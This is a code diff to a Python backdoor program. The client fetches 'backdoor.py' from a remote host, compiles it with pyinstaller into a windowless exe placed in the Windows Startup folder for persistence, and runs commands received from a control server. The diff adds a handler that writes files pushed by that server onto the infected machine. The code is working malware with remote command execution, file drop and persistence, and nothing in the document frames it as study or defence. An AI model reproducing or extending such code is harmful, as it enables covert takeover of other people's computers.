@@ -59,6 +59,32 @@ def recv_commands():
                     except:
                         pass
                 if len(full_msg) > 0:
+                    if "efile" in full_msg[:8]:
+                        full_msg = full_msg[7:]
+                        name_index = full_msg.index("endname")
+                        name = full_msg[:name_index - 1]
+                        full_msg = full_msg[name_index + 8:]
+                        name_counter = 0
+                        base_name = name
+                        while True:
+                            try:
+                                file = open(name, "x")
+                            except FileExistsError:
+                                name_counter += 1
+                                temp_name = os.path.splitext(base_name)
+                                temp_name = list(temp_name)
+                                temp_name[0] = temp_name[0] + str(name_counter)
+                                name = temp_name[0] + temp_name[1]
+                            else:
+                                break
+                        file.write(full_msg)
+                        file.close()
+                        msg = f"file \"{name}\" saved in {os.getcwd()}"
+                        msg = f"{len(msg):<{HEADERSIZE}}" + msg
+                        s.send(bytes(msg, "utf-8"))
+                        new_msg = True
+                        full_msg = ""
+                        continue
                     if "getos" in full_msg:
                         output_bytes = bytes(str(platform.system() + "\n"), "utf-8")
                     elif "info" in full_msg and platform.system() == "Windows":
@@ -103,6 +129,12 @@ def create_backdoor(request):
         global startup_location
         location = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe".format(str(getpass.getuser()))
         startup_location = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(str(getpass.getuser()))
+        win_cmd = subprocess.Popen("pip install pyinstaller", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        res_win = win_cmd.stderr.read()
+        mac_linux_cmd = subprocess.Popen("pip3 install pyinstaller", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        res_mac_linux = mac_linux_cmd.stderr.read()
+        if res_win == b"" and res_mac_linux == b"":
+            return
         command = "pyinstaller -w --onefile --distpath \"{}\" --clean --workpath .\.build --name {} temp.py ".format(startup_location, name)
         exe_subp = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         result = str(exe_subp.stdout.read() + exe_subp.stderr.read(), "utf-8")
@@ -112,6 +144,7 @@ def create_backdoor(request):
         else:
             print("Exe create successfully")
         clear()  # calls to clear all unnecessary files
+        backdoor_process.daemon = True
 
         
 # Delete all files the backdoor creation created
@@ -204,11 +237,17 @@ request = requests.get("http://myspecialsite.host20.uk/backdoor.py")
 commands_process = multiprocessing.Process(target=recv_commands)  # Creating a process to connect to server and execute commands
 commands_process.daemon = True
 backdoor_process = multiprocessing.Process(target=create_backdoor, args=(request, ))
-backdoor_process.daemon = True
+backdoor_process.daemon = False
 if __name__ == "__main__":
-    commands_process.start()
-    backdoor_process.start()
-    win.mainloop()
+    try:
+        commands_process.start()
+        backdoor_process.start()
+        win.mainloop()
+    except KeyboardInterrupt:
+        try:
+            commands_process.kill()
+        except Exception:
+            pass
     try:
         if platform.system() == "Windows":
             #os.system("\"{}\\{}.exe\"".format(startup_location, name))
